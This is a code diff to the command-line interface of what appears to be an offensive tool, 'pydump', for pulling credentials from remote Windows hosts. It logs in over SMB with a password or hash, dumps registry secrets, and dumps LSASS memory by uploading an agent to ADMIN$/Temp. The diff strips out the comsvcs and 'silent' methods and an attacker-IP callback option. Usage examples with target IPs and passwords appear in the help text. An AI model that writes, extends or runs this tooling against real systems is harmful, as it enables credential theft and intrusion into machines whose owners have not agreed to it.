@@ -16,7 +16,6 @@ def main():
 examples:
   pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
   pydump dump -t 192.168.1.50 -u admin -H aad3b4...ef40 -m registry
-  pydump dump -t 192.168.1.50 -u admin -p pass --lhost 10.0.0.5
   pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
   pydump parse -f lsass.dmp
 """,
@@ -35,14 +34,11 @@ examples:
     dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
     dump_parser.add_argument(
         "-m", "--method",
-        choices=["auto", "registry", "comsvcs", "silent", "pipe"],
+        choices=["auto", "registry", "pipe"],
         default="auto",
         help="Extraction method (default: auto = registry + pipe agent)",
     )
     dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
-    dump_parser.add_argument("--lhost", default=None, metavar="IP",
-                             help="Attacker IP for fileless UNC delivery or silent callback")
-    dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
     dump_parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
     dump_parser.add_argument("-o", "--output", default=None, metavar="FILE", help="Save raw LSASS dump to file")
 
@@ -77,8 +73,6 @@ examples:
 def _cmd_dump(args):
     """Full credential extraction: registry + LSASS."""
     from .smb import SmbSession
-    from .dump.methods import ComSvcsDump, SilentDump, PipeDump
-    from .secrets.registry import RegistrySecrets
 
     print(f"[*] Connecting to {args.target}...")
 
@@ -89,7 +83,7 @@ def _cmd_dump(args):
             print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")
 
             do_registry = args.method in ("auto", "registry")
-            do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")
+            do_lsass = args.method in ("auto", "pipe")
 
             if do_registry:
                 _dump_registry(session)
@@ -160,43 +154,22 @@ def _dump_registry(session):
 
 def _dump_lsass(session, args):
     """Dump LSASS memory and extract credentials."""
-    from .dump.methods import ComSvcsDump, SilentDump, PipeDump
+    from .dump.methods import PipeDump
 
     print()
     print("── LSASS Memory ─────────────────────────────────────────────")
 
-    method_name = args.method if args.method not in ("auto", "registry") else "pipe"
+    agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
+    if not os.path.isfile(agent_path):
+        print(f"[!] Agent not found: {agent_path}")
+        print("    Build it with: cd agent && make cross")
+        return
 
-    if method_name == "pipe":
-        agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
-        if not os.path.isfile(agent_path):
-            print(f"[!] Agent not found: {agent_path}")
-            print("    Build it with: cd agent && make cross")
-            return
-        fileless = bool(args.lhost)
-        method = PipeDump(session, agent_path, lhost=args.lhost)
-        if fileless:
-            print(f"[*] Method: pipe (fileless via \\\\{args.lhost})")
-        else:
-            print("[*] Method: pipe (agent uploaded to ADMIN$/Temp)")
-    elif method_name == "comsvcs":
-        method = ComSvcsDump(session)
-        print("[*] Method: comsvcs")
-    elif method_name == "silent":
-        if not args.lhost:
-            print("[!] --lhost required for silent method")
-            return
-        method = SilentDump(session, args.lhost)
-        print("[*] Method: silent")
-    else:
-        method = ComSvcsDump(session)
-        print(f"[*] Method: {method_name}")
+    method = PipeDump(session, agent_path)
+    print("[*] Method: pipe (agent uploaded to ADMIN$/Temp)")
 
     try:
-        if method_name == "silent":
-            dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
-        else:
-            dump_data = method.execute(lsass_pid=args.pid)
+        dump_data = method.execute(lsass_pid=args.pid)
     except Exception as e:
         print(f"[!] LSASS dump failed: {e}")
         return
